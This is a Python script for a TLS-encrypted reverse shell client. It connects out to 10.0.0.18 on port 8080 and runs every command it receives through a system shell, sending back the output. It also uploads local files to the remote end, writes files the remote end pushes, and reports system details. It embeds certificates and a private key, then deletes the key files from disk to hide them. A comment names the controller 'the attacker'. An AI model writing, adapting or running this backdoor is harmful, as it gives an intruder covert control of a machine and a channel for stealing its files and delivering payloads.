#!/usr/bin/python3
import socket, platform, ssl, subprocess
from printlib import *
from time import time
from os import remove, path
from datetime import datetime
from sys import exit

remote_ip = '10.0.0.18'
remote_port = 8080
server_sni_hostname = ''
VERBOSE = True


def create_keys():
    server_cert ='''\
-----BEGIN CERTIFICATE-----
MIIDazCCAlOgAwIBAgIUP6DvhuFs2TjmBbb1WwF6Zogv1 e8wDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMDAyMjgwNTU5MzlaFw0zMDAy
MjUwNTU5MzlaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQC+7zcGw6R/OnPFm+hKZYGPiM4/imSoEMUCgZcDwv7m
/c2O9pB6Y5hhe6wtaLz8cTjVsfHpTRECzlAqxwjSLPjHzBkY639QHnOd+R9VSX9E
WQEslo6i1YRkRR8B8XL1eJnili8h1uLZ/rQmdxAtIwtoJKgsEYaW7Dzh4RWo5nlm
ZUM6Hfh3T3HupyqvXmi4b+EEdCOVMvDZps8QJuHH6ypmbHhF6vwWjoAp1qKZIeqY
ZR+b71DXKBkKRqIsf0ycjZyJxOE0YRqHA+hOtKCGSwN9aMWhG6sQGlpUdbrk+9pz
ATA8AitVE94ZIC0rFLL5ziCLtjPcScnG0i4D6FFmygHPAgMBAAGjUzBRMB0GA1Ud
DgQWBBTNhLMivwkItr7Be3VMj9/6KM3yiTAfBgNVHSMEGDAWgBTNhLMivwkItr7B
e3VMj9/6KM3yiTAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQAx
zhmr0jwUkvqeAl46GOUDslgaOrCVYwJj/4R1cGRCb0bQKPbLmoBRn+YDl1wa2ro5
pl/0qro2g4n9f31kFVm3jn3132CONabxz4+pn2hvHOV+qvJ1cs0ZuIRyAX5oYSgF
h8jRgw5kMzLy4zdXXTovEW1nsjO7G3SUc9GC3EOOx3DFRUDC4rgUzBrRCxh2j574
6zrFqAgMD7QKAbMfttcn0JoFV71IPH1X/SATSgHHBfs6DkVYtI4/tPkMkxOBf5hq
CwszvFk5+ZOFJ+o66mAc4OSkt8aiRMxjHg3vSjsrW4EVqGRz+ohuoDDoKIxlgRqN
H1fwfP6xGzn/UjUTNWuz
-----END CERTIFICATE-----'''
    with open("server_cert",'w') as file:
        file.write(server_cert)
    client_cert = '''\
-----BEGIN CERTIFICATE-----
MIIDazCCAlOgAwIBAgIUbpFUojamR1OPhQJUwDJzW0W1sG8wDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMDAyMjgwNjAwMDBaFw0yMTAy
MjcwNjAwMDBaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQClYnr6PZrghUhxwiwHvNl1zWhc0IDXW/odOe4/mRHS
K5wVhdj25tLA520o/fVxwYt5tSwW48HM2PIRJDeABH88WqlLfILogv6/C5OkJrSD
tyrbNjlUx1yqbiAWbsE6Jmss5CySzHTZgbs5QGVvnxW5DcfQlEWa4pYDLemeETy9
kabLFWPMDkbQq6M8Rc3GAXuTKwW5ym6pBBonVqB0p/nvxMeAh6eQS61D73uv9d0N
AcWWCedpjz+4Js2tYLBMuKrwGOao9RiGg1Su0y9vIp/0n3XJ4HBsTcxMF664e8ED
I7IC3SwCOhWrmhSA8eQ1Kws5dJ8ButW5+80Ikbz/kAeFAgMBAAGjUzBRMB0GA1Ud
DgQWBBSpeICTMVzbAL74rkG7Rp5cdpT/OjAfBgNVHSMEGDAWgBSpeICTMVzbAL74
rkG7Rp5cdpT/OjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQCY
VBDMh+y9uBAn/1S/8xmvttQQYakw1YG0wY5APoCJZPp+SurMh+xDc1dhEW6W5n65
wQTh6VmLwkfBRRLfHBWAtcFO5hW7N8MlvCerXzh30Mld37FrW0KnW7XNpXwC+XJB
KbhxF9OS9fwrQwZa4rtx8xWl93rnxuHG1ZRAPnar79DNCXII3/oh/kfcyaTugrWK
ijlopmmNvPM+rur2VGv8FheKUkyUNM0U7l6NR17ao/hVIzq7ga86e5Xidl8/gbUH
IbWmkL3apSpCeQx2nKBMwT8c+lJixO40meyxpIzTnEuTSHEXYY5/h2jlvNmLcScO
z/BKKDg5xkjlf0TAyaAo
-----END CERTIFICATE-----'''
    with open("client_cert",'w') as file:
        file.write(client_cert)
    client_key= '''\
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClYnr6PZrghUhx
wiwHvNl1zWhc0IDXW/odOe4/mRHSK5wVhdj25tLA520o/fVxwYt5tSwW48HM2PIR
JDeABH88WqlLfILogv6/C5OkJrSDtyrbNjlUx1yqbiAWbsE6Jmss5CySzHTZgbs5
QGVvnxW5DcfQlEWa4pYDLemeETy9kabLFWPMDkbQq6M8Rc3GAXuTKwW5ym6pBBon
VqB0p/nvxMeAh6eQS61D73uv9d0NAcWWCedpjz+4Js2tYLBMuKrwGOao9RiGg1Su
0y9vIp/0n3XJ4HBsTcxMF664e8EDI7IC3SwCOhWrmhSA8eQ1Kws5dJ8ButW5+80I
kbz/kAeFAgMBAAECggEBAIF2U9or+18iNpGGdD0iYgBLaRSuywzKnUHfpVb3lfG1
3ZsjibHNAtGq19Ks6kPARFRjtD2+0Ghwsx0kAqYd3xP5zGig8UDdulkG0O5AtjId
YljzW3G4Fhv71PZ6gJvqkx8zBolrr1TMryij9kOofrK7zNzEFLCoCtI2UJhB2hBx
/5SqSixi7qirhrdFdreB8oTJJvNseIjroA8T5Ch+6UqEO6KxptBLyZmesiA9Z5YQ
pCk5jpLbKkqy1JGgyQUfb9p4MpHlYjH34l/mGRx4DfTwgAIH3Y8NlrPgykouXr6B
u3kVYsXVIEPC/1zkNNb6gbqK/QqUyzX13QW/8x3vqwECgYEA1IiJmqUklSV3C0X8
ryxnt3JFksWQpz08oW1mQdKpxePzjJmakUYlKdl4TPh3CDeCh+gifdtxLy/NovQ2
7U7h5TyhT/HBbY8jpHX82CFIh1cuzXDFWuus3UxHm3OqFJ2qUAxLwSukbpnSdRap
3EtiBVNXeHjhsfBLte6tgYTJNOUCgYEAxzVpsIH51i2TJfcVSGlu692cqlSvuWbo
eJAplFqUdH2aXl3khs5GM2Nl7ZoRAEUkuukWY8ZL/MM+0CQ2jY73sRpAiw7yf0lc
LHSiwjz9XR+g4Hav/9dM3L+QNi81czS4CbcCpwg/A8U0vV21ZPZA8MuxYyVeAZJ+
EKLNzX1B/iECgYA4mWfz3Bji80hBo1DIoc25J+BpVt3P+9nir4y06NI3lh4tClcE
aybIf1avQNgKQyYq5WISHFeHFnbv95ONHR3Be6UF8j7t21nFmXpNYIe9KzWWlnqo
XOz7Pi4vstzPgrFxgeTGu8Wdgq9uaSuxNA4Vlv1LYv3P8ktnVvmz7VXcFQKBgATu
7rIfVeeW81jyWIWVjtiqgVG6jSuDP+iUcWMqJxkHb0Y8/wbTnutw37pVoWwnSjSS
xyorZABbeXfAHdW9n6a0JrsK4LiEQZMcRFeZGREwUlScu9kTJOUmnVSqMKGswY4E
CT3Ht3/JZ3f1FSPt8UfFU5xH9Z8GWLbiwUQAgRzhAoGARVxLAHuUNCbbrZQESN/6
vU4QrlqMsOaEzNRfwfwKQidK4jbzvTZMzADjQodHhq0x/yv3SVL5Z2kP6VEXIkji
kol5xIDAD/43O2UzDTXFW0hZk4CFy7EvD9PpBXpl0PtYiojw6rHaHJWeXXSe9+LJ
TZdCKivQ2PsE9Uw8BwCZYJI=
-----END PRIVATE KEY-----'''
    with open("client_key",'w') as file:
        file.write(client_key)

def delete_keys():
    try:
        remove("client_key")
        remove("client_cert")
        remove("server_cert")
    except FileNotFoundError:
        pass

def sysinfo():
    date_time = datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S')
    sys_info ="""
Local Time: {}
system: {}
release: {}
version: {}
machine: {}
processor: {}
node: {}""".format(date_time,platform.system(),platform.release(),platform.version(),platform.machine(),platform.processor(),platform.node())
    return sys_info

def send_data(conn, plain_text):
    msg = plain_text + "[END]"
    conn.send(msg.encode('utf-8'))
    if VERBOSE:
        print_info("Sent:\n"  +plain_text)

def file_transfer_get(conn, file_name):      #push to server - response from a 'get'
    f = open(file_name, 'rb')
    data = f.read(128)
    if VERBOSE:
        print_info("Sending File:\n" + file_name)
    while data:
        conn.send(data)
        data = f.read(128)
    conn.send("[END]".encode('utf-8'))
    f.close()

def file_transfer_put(conn, file_name):     #download from server - response from a 'put'
    f = open(file_name,'wb')
    if VERBOSE:
        print_info("Receiving --> {}".format(file_name))
    while True: 
        data = conn.recv(128)
        if data.endswith(b"[END]"):
            f.write(data.rstrip(b"[END]"))
            print_good("Transfer completed")
            f.close()
            break
        else:
            f.write(data)
    f.close()

def connect(remote_ip=remote_ip, remote_port=remote_port):
    data = ""
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile='server_cert')
    context.check_hostname = False
    context.load_cert_chain(certfile='client_cert', keyfile='client_key')
    delete_keys()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn = context.wrap_socket(s, server_side=False)
    conn.connect((remote_ip, remote_port))
    if VERBOSE:
        print_good("SSL established. Peer: {}".format(conn.getpeercert()))

    while True: 
        data = ""
        while not data.endswith('[END]'):
            recv = conn.recv(128)
            recv_decoded = recv.decode('utf-8')
            data = data + recv_decoded
        data = data.rstrip('[END]')
        if VERBOSE:
            print_info("Received:\n" + data)
        if 'kill' in data: # if we got terminate order from the attacker, close the socket and break the loop
            if VERBOSE:
                print_warn("Received kill command")
            conn.close()
            break 
        elif "get" in data:  #find file locally then push to remote server
            if VERBOSE:
                print_info("Received GET")
            file_name = data.split()[1]
            if path.exists(file_name):
                file_transfer_get(conn, file_name)
            else:
                send_data(conn, "FILE_NOT_FOUND")
            data = ""
        elif "put" in data:
            if VERBOSE:
                print_info("Received PUT")
            file_name = data.split()[2]
            file_transfer_put(conn, file_name)
        elif data == "sysinfo":
            sys_info = sysinfo()
            send_data(conn, sys_info)
        else: # otherwise, we pass the received command to a shell process
            #cmds = data.split()
            if VERBOSE:
                print_info("Received cmd --> {}".format(data))
            output = subprocess.getoutput(data)
            send_data(conn, output) # send back the result
            data = "" #reset the data received

def main ():
    try:
        create_keys()
        connect(remote_ip,remote_port)
    finally:
        delete_keys()
main()